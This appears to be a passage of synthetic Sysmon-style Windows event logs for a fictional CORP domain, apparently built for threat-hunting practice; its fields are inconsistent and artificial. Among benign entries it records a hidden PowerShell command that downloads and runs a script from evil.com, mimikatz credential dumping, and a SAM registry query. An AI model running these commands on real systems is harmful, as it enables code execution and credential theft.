  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "dave",
    "UtcTime": "2024-03-18T17:42:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "7638",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3812e852c33af332d0a2c1e37534bfde54f5c98eecc41e695e7b38bd4da42bb9"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-01T10:45:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\reg.exe",
      "CommandLine": "reg query HKLM\\SAM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "1311",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=393a3653b848a4623d56ebcbe6a681072a15f3d90ad1e879b1adfb07efc8dc39"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "bob",
    "UtcTime": "2024-03-07T01:48:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "6241",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=afa69b6b653156ef1c55daea421e6d827802f2466ccce32b4c9a48d5113df240"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "dave",
    "UtcTime": "2024-03-13T13:31:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "4581",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=fdbebeb439ccbfa3d3e4e1e2c87c01f3ea45dd71faaa0ca71e6bc8c6d87d43b4"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "alice",
    "UtcTime": "2024-03-26T02:54:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "3982",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c2421bf042e973312f8f26cd1d0f00c5715074590f223f354a172d60c18f59f1"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-01T08:44:00Z",
    "EventData": {
      "Image": "C:\\tools\\mimikatz.exe",
      "CommandLine": "mimikatz.exe sekurlsa::logonpasswords privilege::debug exit",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "4056",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b99ad78f0a3d7b36c2a19e49e7a4748c2755765935b815eba4716844aff3ef6e"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-02",
    "UtcTime": "2024-03-18T14:03:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.15",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.157",
      "SourcePort": "53755"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "administrator",
    "UtcTime": "2024-03-24T16:58:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "5215",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=2e9a01175d06a7fe44e28b843f4e954033b8fee01a42a7798b7d71aeff0a2389"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "dave",
    "UtcTime": "2024-03-20T15:44:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "4188",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=407da14a8fb938119f3cd42ddf1626d99be4663e7b985bba48a3980a274236fc"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-07T09:55:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "5215",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6f11689d5fc7aca7c77d3a66eaa6246006d0d0caa5a08ca02952ac16dcb82345"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "administrator",
    "UtcTime": "2024-03-19T14:17:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "7518",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=eafd38df81b0e25ca75863ae8071aad3f054f049a1a83d4e5ca151fd1900e11f"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "administrator",
    "UtcTime": "2024-03-24T01:27:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "4421",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=df3b2028e9e5d35c43196cba9c853284dd69282415ea99e7ba603993a5fb9428"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-12T17:42:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "5981",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=8ebdfe942cb6a13ce79309edc7c383b5c2605f2ad3a9662f876d0427af59c7b3"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-01T08:00:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "3543",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f2831a7bd93fc139b293a41b94c703a074cd86c64478b70c3b32009ac180d0bc"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "administrator",
    "UtcTime": "2024-03-04T12:03:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "1922",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=ce56da917980fece7d157b350a93beb48b4650f52075a0176feb04ea717f342f"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "alice",
    "UtcTime": "2024-03-17T16:16:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "1488",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9663a59c476c84d0b15c2113d23725f25fdff3f907de1afc72880860a3dae446"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-17T03:22:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9648",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0e95f55bd73b04b9330ee5baf0bbfd7d93557e19efb67147594697dc59fd2716"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-28T17:52:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "4803",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=117157edd51e8ccbb7f265efaadb164625afd477734104353de256f107bf428f"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-07",
    "UtcTime": "2024-03-11T06:56:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.7",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.124",
      "SourcePort": "57550"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-04",
    "UserName": "charlie",
    "UtcTime": "2024-03-22T17:29:00Z",
    "EventData": {
      "SubjectUserName": "alice",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "bob",
    "UtcTime": "2024-03-27T21:35:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "7998",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=8ec6746111b09c5f9f6f312d5e8bf54f224384025adba9d6816991443479dc11"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-22T03:32:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "9731",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=62afc9b78a855729ed6b61a61aaaeba2031f993cc486bb7aa41ad2201c53b734"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-01T08:03:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "3700",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=835037e3763b51d2fcbbe0af85eaa20ff4e51ea62f31c22cb50277cff623cd8a"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-02",
    "UtcTime": "2024-03-27T10:18:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "DestinationIp": "10.0.0.188",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.142",
      "SourcePort": "59488"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-13T04:54:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "7501",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=59d390d33a859dedcf96e93b42333e6ee33f7fff3d46ff8a304b30cf72f80492"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-10T07:24:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "8657",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9596b338cc5e47cb4ea55ab36297da297d9be78a8c882d60865d07d7f7adeeed"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-06",
    "UtcTime": "2024-03-15T20:56:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "DestinationIp": "10.0.0.62",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.200",
      "SourcePort": "60907"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-17T10:47:00Z",
    "EventData": {
      "SubjectUserName": "bob",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "alice",
    "UtcTime": "2024-03-18T01:53:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "6804",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4433570a73f4392eb9d107455486521ab9ea3427c2928b45a38be62b4a757028"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-06",
    "UtcTime": "2024-03-07T16:27:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.67",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.90",
      "SourcePort": "57070"
    }
  },
  {
    "EventID": 3,
    "Computer": "DC-01",
    "UtcTime": "2024-03-19T21:44:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.217",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.164",
      "SourcePort": "57927"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "dave",
    "UtcTime": "2024-03-05T03:54:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9592",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=8ba871d38ff8c32ec0fefc88e4f1e84ea30bfa8cd92887c63284a8e594431588"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-01",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-14T13:23:00Z",
    "EventData": {
      "SubjectUserName": "dave",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-05",
    "UtcTime": "2024-03-09T13:39:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.205",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.36",
      "SourcePort": "61404"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-05",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-28T19:48:00Z",
    "EventData": {
      "SubjectUserName": "svc_backup",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "administrator",
    "UtcTime": "2024-03-01T08:25:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -enc ZQBjAGgAbwAgAEgAZQBsAGwAbwAgAFcAbwByAGwAZAA=",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "2611",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=cb78efb6514e35c5934841ce3ae657b8863bcb217bdddec8bb7d9de4d3400d42"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "bob",
    "UtcTime": "2024-03-22T19:22:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "4155",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=49b09278c79f904fbfa5b4accbfc94959b0494d2d69ca1ffebd1659e13029e02"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "bob",
    "UtcTime": "2024-03-19T11:06:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "2583",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3d168ce9ead1eb4d368010fc7cb943697472f9acc2a00f3b03054670a2579cc5"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "alice",
    "UtcTime": "2024-03-05T09:47:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "6422",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d82533abc787212d35346c88d40009035db6be887224ba3d5bd102a346048333"
    }
  },
  {
    "EventID": 3,
    "Computer": "DC-01",
    "UtcTime": "2024-03-04T09:48:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "DestinationIp": "10.0.0.25",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.43",
      "SourcePort": "61866"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "charlie",
    "UtcTime": "2024-03-16T04:10:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "3820",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=26b60aae1d7f3026c4b7174cb2001fa57d110196c443f4698f04ffc4051f716b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-25T05:44:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "3995",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=8e97ead73bd5f4a6086c360c4333babb23edc5db6b7e51d47b958e20f8b80773"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-06",
    "UtcTime": "2024-03-23T00:12:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "DestinationIp": "10.0.0.142",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.109",
      "SourcePort": "63789"
    }
  },
  {
    "EventID": 4624,
    "Computer": "DC-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-11T01:26:00Z",
    "EventData": {
      "SubjectUserName": "administrator",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-17T19:38:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "3124",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=84db0d2c5a83ff2b1e305a4e1768420c5685d08f5c1960886ad4c64f38c249eb"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-01T08:25:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "7591",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=25553dacf2c2524d98f47b78d32aa8a8951be4cac1e5516e23d7a48c634614a5"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "bob",
    "UtcTime": "2024-03-28T17:50:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "3496",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=667235b865fc225c1d155c47631dbcbaa8c1740eb0dc94da518b0eb04292eff4"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-30T07:56:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "7512",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b4373b275a2b778c9cff50ccb957775cd5ebc200be61d7ea528dadf54ac0bffc"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "dave",
    "UtcTime": "2024-03-23T08:55:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "9639",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=34ca51a18848a5edfbe98d53b8620ddf35158ba193467ae925c77a02a422552c"
    }
  },
  {
    "EventID": 3,
    "Computer": "DC-01",
    "UtcTime": "2024-03-18T12:24:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.141",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.237",
      "SourcePort": "61925"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "charlie",
    "UtcTime": "2024-03-04T16:27:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "3842",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=11d57cc832aa9f0ac31b78cae2fb195e3885599de4dcacb8453c611cf64024d9"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-20T17:18:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "1464",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=2785f3c2345bc9ea807241cc416bf639fdd449ab6252c009c7c4ccfee93d3e8a"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "alice",
    "UtcTime": "2024-03-04T04:50:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "2531",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e3d3ec83d773e7b7b60084454b8c75347186eb132e77867bb1c1e9b1290bf067"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-14T15:48:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "9909",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=647ff4713f3d1965a9cc73f6d17c3134e0513774a7c5d009c5197feb81c73e7f"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "alice",
    "UtcTime": "2024-03-29T20:31:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "8110",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a4bbb60f0cfaa5a8b07556f78f8dc146746055a43eeed8ad9a1d759128a19a6b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-08T23:15:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "6761",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=5c89c9a5569ec1121f7348dacf2e10c18897c24fa9829e886415df97383c6d12"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-18T10:15:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "1335",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=8af4a85fcbf65e092b9ff63c8b7c4bfc2390da5afffc1a491f961599cb96fe12"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-18T17:45:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "8623",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e250e25a42aadf95e14fc05211c37fee4a9802a2c95953777a9af5e25ede3a25"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-27T07:31:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "6605",
      "IntegrityLevel": "High",
